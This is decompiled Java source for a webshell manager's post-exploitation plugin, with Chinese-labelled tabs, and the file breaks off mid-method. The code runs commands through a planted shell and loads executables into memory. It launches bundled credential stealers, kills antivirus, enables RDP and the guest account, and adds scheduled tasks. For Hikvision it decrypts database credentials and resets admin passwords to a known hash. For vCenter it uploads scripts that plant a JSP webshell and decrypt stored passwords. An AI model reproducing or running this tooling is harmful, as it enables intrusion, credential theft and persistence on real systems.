//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.generic;

import com.intellij.uiDesigner.core.GridConstraints;
import com.intellij.uiDesigner.core.GridLayoutManager;
import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.Timer;
import org.fife.ui.rtextarea.RTextScrollPane;
import sun.misc.BASE64Decoder;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import core.annotation.McpTool;
import core.annotation.McpParam;
import java.util.Map;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;

public abstract class NewCmd implements Plugin {
    protected Payload payload;
    private JPanel panel = new JPanel(new BorderLayout());
    private JPanel Hikpanel = new JPanel(new BorderLayout());
    private JPanel Vcpanel = new JPanel(new BorderLayout());
    private JTextField cmdTextField = new JTextField(36);
    private JButton cmdButton = new JButton("运行");
    private JButton killButton = new JButton("kill360-2");
    private JButton netButton = new JButton("出网探测");
    private JButton runButton = new JButton("获取杀软进程");
    private JButton runButton2 = new JButton("添加计划任务");
    private JButton rdpButton = new JButton("查找rdp端口");
    private JLabel cmdLabel = new JLabel("执行命令: ");
    private JButton runrdpButton = new JButton("开启rdp端口");
    private JButton stoprdpButton = new JButton("关闭rdp端口");
    private JButton guestButton = new JButton("激活guest");
    private JButton informationButton = new JButton("获取信息方法1");
    private JButton informationButton1 = new JButton("获取信息方法2");
    private RTextArea cmdTextArea = new RTextArea();
    private JComboBox<String> serviceComboBox = new JComboBox(new String[]{"运行中心", "Web前台", "MinIO"});
    private JComboBox<String> VserviceComboBox = new JComboBox(new String[]{"Normal", "Linux", "Windows"});
    private JTextField pathTextField = new JTextField(50);
    private JTextField VpathTextField = new JTextField(50);
    private JButton getPathButton = new JButton("获取详情");
    private JButton VgetPathButton = new JButton("获取详情");
    private JButton extractInfoButton = new JButton("提取信息");
    private JButton VextractInfoButton = new JButton("提取信息");
    private JButton userQueryButton = new JButton("SQL查询");
    private JButton VuserQueryButton = new JButton("提权写shell");
    private JButton resetPasswordButton = new JButton("重置密码");
    private JButton VresetPasswordButton = new JButton("获取密码");
    private JButton restorePasswordButton = new JButton("还原密码");
    private JButton VrestorePasswordButton = new JButton("获取Cookie");
    private RTextArea result1TextArea = new RTextArea();
    private RTextArea Vresult1TextArea = new RTextArea();
    private JTextField dbHostTextField = new JTextField(10);
    private JTextField vdbHostTextField = new JTextField(10);
    private JTextField dbPortTextField = new JTextField(5);
    private JTextField vdbPortTextField = new JTextField(5);
    private JTextField dbNameTextField = new JTextField(10);
    private JTextField vdbNameTextField = new JTextField(10);
    private JTextField dbUsernameTextField = new JTextField(10);
    private JTextField vdbUsernameTextField = new JTextField(10);
    private JTextField dbPasswordTextField = new JTextField(10);
    private JTextField vdbPasswordTextField = new JTextField(10);
    private JTextField execSqlTextField = new JTextField(20);
    private JTextField vexecSqlTextField = new JTextField(20);
    private JTextField additionalField1 = new JTextField(40);
    private JTextField vadditionalField1 = new JTextField(40);
    private JTextField additionalField2 = new JTextField(40);
    private JTextField vadditionalField2 = new JTextField(40);
    private JLabel additionalLabel1 = new JLabel("附加信息1:");
    private JLabel vadditionalLabel1 = new JLabel("附加信息1:");
    private JLabel additionalLabel2 = new JLabel("附加信息2:");
    private JLabel vadditionalLabel2 = new JLabel("附加信息2:");
    private JLabel additionalLabel3 = new JLabel("用于存放还原的原始密码和盐");
    private JLabel vadditionalLabel3 = new JLabel("用于存放还原的原始密码和盐");
    private RTextArea memoryPeTextArea = new RTextArea();
    private JLabel argsLabel = new JLabel("args");
    private JLabel readWaitLabel = new JLabel("readWait(ms)");
    private JTextField argsTextField = new JTextField("");
    private JTextField readWaitTextField = new JTextField("7000");
    public JTextField executableArgsTextField;
    public JButton runExecutableButton;
    public JTextField executableFileTextField;
    public JButton chooseExecutableFileButton;
    private JPanel memoryPePanel = new JPanel(new BorderLayout());
    private JLabel excuteFileLabel = new JLabel("注入进程文件: ");
    public RTextScrollPane memoryPeTextScrollPane;
    public JLabel executableFileLabel;
    private JTextField excuteFileTextField = new JTextField("C:\\Windows\\System32\\rundll32.exe", 50);
    private RTextArea codeTextArea = new RTextArea();
    private final RTextArea resultTextArea = new RTextArea();
    private Encoding encoding;
    protected ShellEntity shellEntity;
    private ShellcodeLoader loader;

    public NewCmd() {
        JTabbedPane tabbedPane = new JTabbedPane();
        JTabbedPane habbedPane = new JTabbedPane();
        JPanel commandPanel = new JPanel();
        commandPanel.add(this.cmdLabel);
        commandPanel.add(this.cmdTextField);
        commandPanel.add(this.cmdButton);
        JSplitPane commandSplitPane = new JSplitPane(0);
        commandSplitPane.setTopComponent(commandPanel);
        commandSplitPane.setBottomComponent(new JScrollPane(this.codeTextArea));
        commandSplitPane.setDividerSize(0);
        tabbedPane.addTab("命令执行", commandSplitPane);
        JPanel fscanPanel = new JPanel();
        fscanPanel.add(this.informationButton);
        fscanPanel.add(this.informationButton1);
        JSplitPane fscanSplitPane = new JSplitPane(0);
        fscanSplitPane.setTopComponent(fscanPanel);
        fscanSplitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        fscanSplitPane.setDividerSize(0);
        tabbedPane.addTab("内网信息获取", fscanSplitPane);
        this.memoryPePanel = new JPanel();
        this.memoryPePanel.setLayout(new GridLayoutManager(2, 8, new Insets(0, 0, 0, 0), -1, -1));
        this.argsLabel = new JLabel();
        this.argsLabel.setText("args");
        this.memoryPePanel.add(this.argsLabel, new GridConstraints(0, 3, 1, 1, 8, 0, 0, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
        this.executableArgsTextField = new JTextField();
        this.memoryPePanel.add(this.executableArgsTextField, new GridConstraints(0, 4, 1, 1, 8, 1, 4, 0, (Dimension)null, new Dimension(150, -1), (Dimension)null, 0, false));
        this.readWaitLabel = new JLabel();
        this.readWaitLabel.setText("readWait(ms)");
        this.memoryPePanel.add(this.readWaitLabel, new GridConstraints(0, 5, 1, 1, 8, 0, 0, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
        this.readWaitTextField = new JTextField();
        this.readWaitTextField.setText("7000");
        this.memoryPePanel.add(this.readWaitTextField, new GridConstraints(0, 6, 1, 1, 8, 1, 4, 0, (Dimension)null, new Dimension(150, -1), (Dimension)null, 0, false));
        this.runExecutableButton = new JButton();
        this.runExecutableButton.setText("Run");
        this.memoryPePanel.add(this.runExecutableButton, new GridConstraints(0, 7, 1, 1, 0, 1, 3, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
        this.memoryPeTextScrollPane = new RTextScrollPane();
        this.memoryPePanel.add(this.memoryPeTextScrollPane, new GridConstraints(1, 0, 1, 8, 0, 3, 5, 5, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
        this.memoryPeTextArea = new RTextArea();
        this.memoryPeTextArea.setText("选择文件没用,手动输入列如\"D:\\360MoveData\\Users\\nox\\Desktop\\yara.exe\",请使用pe2shc.exe转换你需要内存加载的文件\n执行时请带参数，不带参数的话跳转到shellcodeloader去加载pe运行");
        this.memoryPeTextScrollPane.setViewportView(this.memoryPeTextArea);
        this.executableFileLabel = new JLabel();
        this.executableFileLabel.setText("可执行程序路径(手动输入路径)");
        this.memoryPePanel.add(this.executableFileLabel, new GridConstraints(0, 0, 1, 1, 0, 0, 0, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
        this.executableFileTextField = new JTextField();
        this.executableArgsTextField.setText("-help");
        this.memoryPePanel.add(this.executableFileTextField, new GridConstraints(0, 1, 1, 1, 8, 1, 4, 0, (Dimension)null, new Dimension(150, -1), (Dimension)null, 0, false));
        this.chooseExecutableFileButton = new JButton();
        this.chooseExecutableFileButton.setHorizontalTextPosition(0);
        this.chooseExecutableFileButton.setText("选择文件");
        this.memoryPePanel.add(this.chooseExecutableFileButton, new GridConstraints(0, 2, 1, 1, 0, 1, 3, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
        JSplitPane memorySplitPane = new JSplitPane(0);
        memorySplitPane.setTopComponent(this.memoryPePanel);
        tabbedPane.addTab("内存加载", memorySplitPane);
        JPanel topPanel = new JPanel();
        topPanel.add(new JLabel("选择服务: "));
        topPanel.add(this.serviceComboBox);
        topPanel.add(this.pathTextField);
        topPanel.add(this.getPathButton);
        topPanel.add(this.extractInfoButton);
        topPanel.add(this.userQueryButton);
        topPanel.add(this.resetPasswordButton);
        topPanel.add(this.restorePasswordButton);
        JPanel dbInfoPanel = new JPanel(new FlowLayout(0, 10, 10));
        dbInfoPanel.add(new JLabel("DBHost:"));
        dbInfoPanel.add(this.dbHostTextField);
        dbInfoPanel.add(new JLabel("DBPort:"));
        dbInfoPanel.add(this.dbPortTextField);
        dbInfoPanel.add(new JLabel("DBName:"));
        dbInfoPanel.add(this.dbNameTextField);
        dbInfoPanel.add(new JLabel("DBUsername:"));
        dbInfoPanel.add(this.dbUsernameTextField);
        dbInfoPanel.add(new JLabel("DBPassword:"));
        dbInfoPanel.add(this.dbPasswordTextField);
        dbInfoPanel.add(new JLabel("ExecSQL:"));
        dbInfoPanel.add(this.execSqlTextField);
        JPanel additionalPanel = new JPanel(new FlowLayout(0, 10, 10));
        additionalPanel.add(this.additionalLabel1);
        additionalPanel.add(this.additionalField1);
        additionalPanel.add(this.additionalLabel2);
        additionalPanel.add(this.additionalField2);
        additionalPanel.add(this.additionalLabel3);
        this.Hikpanel.add(topPanel, "North");
        JPanel centerPanel = new JPanel(new BorderLayout());
        centerPanel.add(dbInfoPanel, "North");
        JPanel additionalAndResultPanel = new JPanel(new BorderLayout());
        additionalAndResultPanel.add(additionalPanel, "North");
        additionalAndResultPanel.add(new JScrollPane(this.result1TextArea), "Center");
        centerPanel.add(additionalAndResultPanel, "Center");
        this.Hikpanel.add(centerPanel, "Center");
        this.serviceComboBox.addActionListener(this::updatePathTextField);
        this.getPathButton.addActionListener(this::getPathButtonClick);
        this.extractInfoButton.addActionListener(this::extractInfoButtonClick);
        this.userQueryButton.addActionListener(this::userQueryButtonClick);
        this.resetPasswordButton.addActionListener(this::resetPasswordButtonClick);
        this.restorePasswordButton.addActionListener(this::restorePasswordButtonClick);
        JSplitPane HikSplitPane = new JSplitPane(0);
        HikSplitPane.setTopComponent(this.Hikpanel);
        HikSplitPane.setDividerSize(0);
        habbedPane.addTab("海康威视", HikSplitPane);
        JPanel vcenterPanel = new JPanel();
        vcenterPanel.add(new JLabel("选择服务: "));
        vcenterPanel.add(this.VserviceComboBox);
        vcenterPanel.add(this.VpathTextField);
        vcenterPanel.add(this.VgetPathButton);
        vcenterPanel.add(this.VextractInfoButton);
        vcenterPanel.add(this.VuserQueryButton);
        vcenterPanel.add(this.VresetPasswordButton);
        vcenterPanel.add(this.VrestorePasswordButton);
        JPanel vdbInfoPanel = new JPanel(new FlowLayout(0, 10, 10));
        vdbInfoPanel.add(new JLabel("DBHost:"));
        vdbInfoPanel.add(this.vdbHostTextField);
        vdbInfoPanel.add(new JLabel("DBPort:"));
        vdbInfoPanel.add(this.vdbPortTextField);
        vdbInfoPanel.add(new JLabel("DBName:"));
        vdbInfoPanel.add(this.vdbNameTextField);
        vdbInfoPanel.add(new JLabel("DBUsername:"));
        vdbInfoPanel.add(this.vdbUsernameTextField);
        vdbInfoPanel.add(new JLabel("DBPassword:"));
        vdbInfoPanel.add(this.vdbPasswordTextField);
        vdbInfoPanel.add(new JLabel("ExecSQL:"));
        vdbInfoPanel.add(this.vexecSqlTextField);
        JPanel vcadditionalPanel = new JPanel(new FlowLayout(0, 10, 10));
        vcadditionalPanel.add(this.vadditionalLabel1);
        vcadditionalPanel.add(this.vadditionalField1);
        vcadditionalPanel.add(this.vadditionalLabel2);
        vcadditionalPanel.add(this.vadditionalField2);
        vcadditionalPanel.add(this.vadditionalLabel3);
        this.Vcpanel.add(vcenterPanel, "North");
        JPanel VcenterPanel = new JPanel(new BorderLayout());
        VcenterPanel.add(vdbInfoPanel, "North");
        JPanel VadditionalAndResultPanel = new JPanel(new BorderLayout());
        VadditionalAndResultPanel.add(vcadditionalPanel, "North");
        VadditionalAndResultPanel.add(new JScrollPane(this.Vresult1TextArea), "Center");
        VcenterPanel.add(VadditionalAndResultPanel, "Center");
        this.Vcpanel.add(VcenterPanel, "Center");
        this.VserviceComboBox.addActionListener(this::vupdatePathTextField);
        this.VgetPathButton.addActionListener(this::VgetPathButtonClick);
        this.VextractInfoButton.addActionListener(this::VextractInfoButtonClick);
        this.VuserQueryButton.addActionListener(this::SudoButtonClick);
        this.VresetPasswordButton.addActionListener(this::VuserQueryButtonClick);
        JSplitPane VenterSplitPane = new JSplitPane(0);
        VenterSplitPane.setTopComponent(this.Vcpanel);
        VenterSplitPane.setDividerSize(0);
        habbedPane.addTab("Vcenter", VenterSplitPane);
        JPanel otherButtonsPanel = new JPanel();
        otherButtonsPanel.add(this.killButton);
        otherButtonsPanel.add(this.netButton);
        otherButtonsPanel.add(this.runButton);
        otherButtonsPanel.add(this.rdpButton);
        otherButtonsPanel.add(this.runrdpButton);
        otherButtonsPanel.add(this.stoprdpButton);
        otherButtonsPanel.add(this.guestButton);
        otherButtonsPanel.add(this.runButton2);
        JSplitPane otherButtonSplitPane = new JSplitPane(0);
        otherButtonSplitPane.setTopComponent(otherButtonsPanel);
        otherButtonSplitPane.setBottomComponent(new JScrollPane(this.cmdTextArea));
        otherButtonSplitPane.setDividerSize(0);
        tabbedPane.addTab("后渗透利用", habbedPane);
        tabbedPane.addTab("其他功能", otherButtonSplitPane);
        this.panel.add(tabbedPane);
    }

    private void runExecutableButtonClick(ActionEvent actionEvent) {
        if (this.loader == null) {
            this.loader = this.getShellcodeLoader();
        }

        if (this.loader == null) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "未找到loader");
            return;
        }
        if (this.runExecutableButton != null) {
            SwingUtilities.invokeLater(() -> this.runExecutableButton.setEnabled(false));
        }
        try {
            File selectdFile = new File(this.executableFileTextField.getText().trim());
            String fileString = selectdFile.getAbsolutePath();
            int readWait = Integer.parseInt(this.readWaitTextField.getText().trim());
            byte[] pe = functions.readInputStreamAutoClose(new FileInputStream(fileString));
            final String out = new String(this.loader.runPe2(this.executableArgsTextField.getText().trim(), pe, readWait));
            SwingUtilities.invokeLater(() -> this.memoryPeTextArea.append(out));
        } catch (Exception var5) {
            final String msg = var5.getMessage() == null ? var5.getClass().getSimpleName() : var5.getMessage();
            SwingUtilities.invokeLater(() -> GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), msg));
        } finally {
            if (this.runExecutableButton != null) {
                SwingUtilities.invokeLater(() -> this.runExecutableButton.setEnabled(true));
            }
        }
    }

    private void informationButtonClick(ActionEvent actionEvent) {
        if (this.loader == null) {
            this.loader = this.getShellcodeLoader();
        }

        if (this.loader == null) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "未找到loader");
        } else {
            byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/Pillager.exe"));

            try {
                byte[] result = this.loader.runNetPe((String)null, pe);
                this.resultTextArea.append(new String(result));
            } catch (Exception var4) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), var4.getMessage());
            }
        }

    }

    private void informationButton1Click(ActionEvent actionEvent) {
        if (this.loader == null) {
            this.loader = this.getShellcodeLoader();
        }

        if (this.loader == null) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "未找到loader");
        } else {
            byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/hunter.exe"));

            try {
                byte[] result = this.loader.runNetPe("all", pe);
                this.resultTextArea.append(new String(result));
            } catch (Exception var4) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), var4.getMessage());
            }
        }

    }

    private void cmdButtonClick(ActionEvent actionEvent) {
        final String cmdPattern = this.cmdTextField.getText();
        (new Thread() {
            public void run() {
                String cmdResult = NewCmd.this.payload.execCommand(cmdPattern);
                SwingUtilities.invokeLater(() -> {
                    NewCmd.this.codeTextArea.setText(cmdResult);
                });
            }
        }).start();
    }

    private void BypassExcuteButtonClick(ActionEvent actionEvent) throws IOException {
        String cmdPattern = this.cmdTextField.getText();
        byte[] decoded = (new BASE64Decoder()).decodeBuffer(cmdPattern);
        new String(decoded, "UTF-8");
    }

    private void updatePathTextField(ActionEvent actionEvent) {
        String selectedService = (String)this.serviceComboBox.getSelectedItem();
        String rootpath = getRootPath(this.payload.currentDir());
        switch (selectedService) {
            case "运行中心":
                this.pathTextField.setText(rootpath + "/opsMgrCenter/conf/config.properties");
                this.additionalLabel1.setText("c_password");
                this.additionalLabel2.setText("c_salt");
                break;
            case "Web前台":
                this.pathTextField.setText(rootpath + "/components/postgresql11linux64.1/conf/config.properties");
                this.additionalLabel1.setText("user_pwd");
                this.additionalLabel2.setText("salt");
                break;
            case "MinIO":
                this.pathTextField.setText(rootpath + "/components/minio.1/conf/config.properties");
                this.additionalLabel1.setText("c_password");
                this.additionalLabel2.setText("c_salt");
                break;
            default:
                this.pathTextField.setText(rootpath + "/opsMgrCenter/conf/config.properties");
                this.additionalLabel1.setText("c_password");
                this.additionalLabel2.setText("c_salt");
        }

    }

    private void vupdatePathTextField(ActionEvent actionEvent) {
        switch ((String)this.VserviceComboBox.getSelectedItem()) {
            case "Normal":
                this.VpathTextField.setText("/etc/vmware-vpx/vcdb.properties");
                this.vadditionalLabel1.setText("c_password");
                this.vadditionalLabel2.setText("c_salt");
                break;
            case "Linux":
                this.VpathTextField.setText("/etc/vmware-vpx/vcdb.properties");
                this.vadditionalLabel1.setText("c_password");
                this.vadditionalLabel2.setText("c_salt");
                break;
            case "Windows":
                this.VpathTextField.setText("C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties");
                this.vadditionalLabel1.setText("user_pwd");
                this.vadditionalLabel2.setText("salt");
                break;
            default:
                this.VpathTextField.setText("/etc/vmware-vpx/vcdb.properties");
                this.vadditionalLabel1.setText("c_password");
                this.vadditionalLabel1.setText("c_salt");
        }

    }

    private void SudoButtonClick(ActionEvent actionEvent) {
        this.Vresult1TextArea.setText("等一会观察/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/是否生成111.jsp\n加密java_base64\npass:pass\nkey:key");
        byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/1.py"));
        this.payload.uploadFile("1.py", pe);
        this.payload.execCommand("python3 1.py");
    }

    private void restorePasswordButtonClick(ActionEvent actionEvent) {
        String selectedService = (String)this.serviceComboBox.getSelectedItem();
        String user_pwd;
        String salt;
        String rootpath;
        String psqlpath;
        String dbPassword;
        String dbHost;
        String dbPort;
        String dbName;
        String dbUsername;
        String sql;
        String cmd;
        String result;
        if ("运行中心".equals(selectedService)) {
            user_pwd = this.additionalField1.getText();
            salt = this.additionalField2.getText();
            rootpath = getRootPath(this.payload.currentDir());
            psqlpath = rootpath + "/components/postgresql11linux64.1/bin";
            dbPassword = this.dbPasswordTextField.getText();
            dbHost = this.dbHostTextField.getText();
            dbPort = this.dbPortTextField.getText();
            dbName = this.dbNameTextField.getText();
            dbUsername = this.dbUsernameTextField.getText();
            sql = "PGPASSWORD='" + dbPassword + "' ./psql -h " + dbHost + " -p " + dbPort + " -U " + dbUsername + " -d " + dbName + " -c \"UPDATE  center_user SET c_password ='" + user_pwd + "',c_salt = '" + salt + "' WHERE c_username='sysadmin'\"";
            cmd = "sh -c \"cd " + psqlpath + "&&" + sql + "\" 2>&1";
            result = this.payload.execCommand(cmd);
            this.result1TextArea.setText("已还原为:\nc_password:" + user_pwd + "\nc_salt:" + salt + "\n结果：" + result);
        } else if ("Web前台".equals(selectedService)) {
            user_pwd = this.additionalField1.getText();
            salt = this.additionalField2.getText();
            rootpath = getRootPath(this.payload.currentDir());
            psqlpath = rootpath + "/components/postgresql11linux64.1/bin";
            dbPassword = this.dbPasswordTextField.getText();
            dbHost = this.dbHostTextField.getText();
            dbPort = this.dbPortTextField.getText();
            dbName = this.dbNameTextField.getText();
            dbUsername = this.dbUsernameTextField.getText();
            sql = "PGPASSWORD='" + dbPassword + "' ./psql -h " + dbHost + " -p " + dbPort + " -U " + dbUsername + " -d " + dbName + " -c \"UPDATE  tb_user SET  user_pwd='" + user_pwd + "',salt = '" + salt + "' WHERE user_name='admin'\"";
            cmd = "sh -c \"cd " + psqlpath + "&&" + sql + "\" 2>&1";
            result = this.payload.execCommand(cmd);
            this.result1TextArea.setText("已还原为:\nuser_pwd:" + user_pwd + "\nsalt:" + salt + "\n结果：" + result);
        } else {
            this.result1TextArea.setText("未支持的服务类型。\n");
        }

    }

    private void resetPasswordButtonClick(ActionEvent actionEvent) {
        String selectedService = (String)this.serviceComboBox.getSelectedItem();
        StringBuilder output = new StringBuilder();
        String rootpath;
        String psqlpath;
        String dbPassword;
        String dbHost;
        String dbPort;
        String dbName;
        String dbUsername;
        String sql;
        String cmd;
        String result;
        if ("运行中心".equals(selectedService)) {
            rootpath = getRootPath(this.payload.currentDir());
            psqlpath = rootpath + "/components/postgresql11linux64.1/bin";
            dbPassword = this.dbPasswordTextField.getText();
            dbHost = this.dbHostTextField.getText();
            dbPort = this.dbPortTextField.getText();
            dbName = this.dbNameTextField.getText();
            dbUsername = this.dbUsernameTextField.getText();
            sql = "PGPASSWORD='" + dbPassword + "' ./psql -h " + dbHost + " -p " + dbPort + " -U " + dbUsername + " -d " + dbName + " -c \"UPDATE  center_user SET c_password ='1909408d3304f41421caae1fd5df984f21d70b516a315d375f94f87861eedc92',c_salt = '938f7ad2436f3084a19dee5dc2e7a513892b696a8069a2f886ada7562226b1cc' WHERE c_username='sysadmin'\"";
            cmd = "sh -c \"cd " + psqlpath + "&&" + sql + "\" 2>&1";
            result = this.payload.execCommand(cmd);
            output.append("默认重置为sysadmin/hik123456\n");
            output.append("结果：" + result);
        } else if ("Web前台".equals(selectedService)) {
            rootpath = getRootPath(this.payload.currentDir());
            psqlpath = rootpath + "/components/postgresql11linux64.1/bin";
            dbPassword = this.dbPasswordTextField.getText();
            dbHost = this.dbHostTextField.getText();
            dbPort = this.dbPortTextField.getText();
            dbName = this.dbNameTextField.getText();
            dbUsername = this.dbUsernameTextField.getText();
            sql = "PGPASSWORD='" + dbPassword + "' ./psql -h " + dbHost + " -p " + dbPort + " -U " + dbUsername + " -d " + dbName + " -c \"UPDATE  tb_user SET  user_pwd='1909408d3304f41421caae1fd5df984f21d70b516a315d375f94f87861eedc92',salt = '938f7ad2436f3084a19dee5dc2e7a513892b696a8069a2f886ada7562226b1cc' WHERE user_name='admin'\"";
            cmd = "sh -c \"cd " + psqlpath + "&&" + sql + "\" 2>&1";
            result = this.payload.execCommand(cmd);
            output.append("默认重置为admin/hik123456\n");
            output.append("结果：" + result);
        } else {
            output.append("未支持的服务类型。\n");
        }

        this.result1TextArea.setText(output.toString());
    }

    public static String getRootPath(String path) {
        path = path.endsWith("/") ? path.substring(0, path.length() - 1) : path;
        int webIndex = path.indexOf("/web");
        return webIndex != -1 ? path.substring(0, webIndex + 4) : path;
    }

    private void getPathButtonClick(ActionEvent actionEvent) {
        String selectedPath = this.pathTextField.getText();
        String configurationDetails = new String(this.payload.downloadFile(selectedPath), StandardCharsets.UTF_8);
        this.result1TextArea.setText(configurationDetails);
    }

    private void VgetPathButtonClick(ActionEvent actionEvent) {
        String selectedPath = this.VpathTextField.getText();
        String configurationDetails = new String(this.payload.downloadFile(selectedPath), StandardCharsets.UTF_8);
        this.Vresult1TextArea.setText(configurationDetails);
    }

    private void extractInfoButtonClick(ActionEvent actionEvent) {
        String configurationDetails = this.result1TextArea.getText();
        String extractedInfo = this.extractRelevantInfo(configurationDetails);
        Timer timer = new Timer(500, (e) -> {
            this.result1TextArea.setText(extractedInfo);
        });
        timer.setRepeats(false);
        timer.start();
    }

    private void VextractInfoButtonClick(ActionEvent actionEvent) {
        String configurationDetails = this.Vresult1TextArea.getText();
        String extractedInfo = this.vextractRelevantInfo(configurationDetails);
        Timer timer = new Timer(500, (e) -> {
            this.Vresult1TextArea.setText(extractedInfo);
        });
        timer.setRepeats(false);
        timer.start();
    }

    private void userQueryButtonClick(ActionEvent actionEvent) {
        String selectedService = (String)this.serviceComboBox.getSelectedItem();
        String rootpath;
        String psqlpath;
        String dbPassword;
        String dbHost;
        String dbPort;
        String dbName;
        String dbUsername;
        String execSql;
        String sql;
        String cmd;
        String result;
        String[] rows;
        String dataRow;
        String[] columns;
        if ("运行中心".equals(selectedService)) {
            rootpath = getRootPath(this.payload.currentDir());
            psqlpath = rootpath + "/components/postgresql11linux64.1/bin";
            dbPassword = this.dbPasswordTextField.getText();
            dbHost = this.dbHostTextField.getText();
            dbPort = this.dbPortTextField.getText();
            dbName = this.dbNameTextField.getText();
            dbUsername = this.dbUsernameTextField.getText();
            execSql = this.execSqlTextField.getText();
            sql = "PGPASSWORD='" + dbPassword + "' ./psql -h " + dbHost + " -p " + dbPort + " -U " + dbUsername + " -d " + dbName + " -c \"" + execSql + "\n";
            cmd = "sh -c \"cd " + psqlpath + "&&" + sql + "\" 2>&1";
            result = this.payload.execCommand(cmd);
            this.result1TextArea.setText(result);
            rows = result.split("\n");
            if (rows.length > 2) {
                dataRow = rows[2].trim();
                columns = dataRow.split("\\s*\\|\\s*");
                if (columns.length >= 5) {
                    this.additionalField1.setText(columns[3].trim());
                    this.additionalField2.setText(columns[4].trim());
                }
            }
        } else if ("Web前台".equals(selectedService)) {
            rootpath = getRootPath(this.payload.currentDir());
            psqlpath = rootpath + "/components/postgresql11linux64.1/bin";
            dbPassword = this.dbPasswordTextField.getText();
            dbHost = this.dbHostTextField.getText();
            dbPort = this.dbPortTextField.getText();
            dbName = this.dbNameTextField.getText();
            dbUsername = this.dbUsernameTextField.getText();
            execSql = this.execSqlTextField.getText();
            sql = "PGPASSWORD='" + dbPassword + "' ./psql -h " + dbHost + " -p " + dbPort + " -U " + dbUsername + " -d " + dbName + " -c \"" + execSql + "\"";
            cmd = "sh -c \"cd " + psqlpath + "&&" + sql + "\" 2>&1";
            result = this.payload.execCommand(cmd);
            this.result1TextArea.setText(result);
            rows = result.split("\n");
            if (rows.length > 2) {
                dataRow = rows[2].trim();
                columns = dataRow.split("\\s*\\|\\s*");
                if (columns.length >= 5) {
                    this.additionalField1.setText(columns[6].trim());
                    this.additionalField2.setText(columns[7].trim());
                }
            }
        } else {
            this.result1TextArea.setText("未支持的服务类型。\n");
        }

    }

    private void VuserQueryButtonClick(ActionEvent actionEvent) {
        this.payload.execCommand(this.vexecSqlTextField.getText());
        byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/a.py"));
        this.payload.uploadFile("a.py", pe);
        String a = this.payload.execCommand("python3 a.py /etc/vmware-vpx/ssl/symkey.dat password.enc password.txt");
        this.Vresult1TextArea.setText("解密成功,生成文件为password.txt,密码如下：\n" + a);
    }

    private String extractRelevantInfo(String config) {
        StringBuilder extracted = new StringBuilder();
        String selectedService = (String)this.serviceComboBox.getSelectedItem();
        String accessKey;
        String webPort;
        String secretKey;
        if ("运行中心".equals(selectedService)) {
            accessKey = extractLineValue(config, "opsmgr.center.port");
            extracted.append("运行中心端口：\n").append(accessKey).append("\n\n");
            webPort = "jdbc:postgresql://" + extractLineValue(config, "opsmgr.database.ip");
            secretKey = extractLineValue(config, "opsmgr.database.port");
            String dbName = extractLineValue(config, "opsmgr.database.dbname");
            String username = extractLineValue(config, "opsmgr.database.username");
            String password = ISECUREController.DecryptData(extractLineValue(config, "opsmgr.database.password"));
            extracted.append("数据库配置：\n").append(webPort).append(":").append(secretKey).append("/").append(dbName).append("?user=").append(username).append("&password=").append(password).append("\n");
            this.dbHostTextField.setText("127.0.0.1");
            this.dbPortTextField.setText(secretKey);
            this.dbNameTextField.setText(dbName);
            this.dbUsernameTextField.setText(username);
            this.dbPasswordTextField.setText(password);
            this.execSqlTextField.setText("SELECT * FROM \"center_user\" WHERE c_username='sysadmin'");
        } else if ("Web前台".equals(selectedService)) {
            accessKey = extractLineValue(config, "rdbms.1.port");
            webPort = extractLineValue(config, "rdbms.1.username");
            secretKey = ISECUREController.DecryptData(extractLineValue(config, "rdbms.1.password"));
            extracted.append("数据库配置：\n").append("jdbc:postgresql://127.0.0.1:").append(accessKey).append("/irds_irdsdb?user=").append(webPort).append("&password=").append(secretKey).append("\n");
            this.dbHostTextField.setText("127.0.0.1");
            this.dbPortTextField.setText(accessKey);
            this.dbNameTextField.setText("irds_irdsdb");
            this.dbUsernameTextField.setText(webPort);
            this.dbPasswordTextField.setText(secretKey);
            this.execSqlTextField.setText("SELECT * FROM tb_user WHERE user_name='admin'");
        } else if ("MinIO".equals(selectedService)) {
            accessKey = extractLineValue(config, "minio.1.accessKey");
            webPort = extractLineValue(config, "minio.1.webPort");
            secretKey = ISECUREController.DecryptData(extractLineValue(config, "minio.1.secretKey"));
            extracted.append("MinIO配置：\n").append("端口：").append(webPort).append("\n").append("账号：").append(accessKey).append("\n").append("密码：").append(secretKey).append("\n");
        } else {
            extracted.append("未支持的服务类型。\n");
        }

        return extracted.toString();
    }

    private String vextractRelevantInfo(String config) {
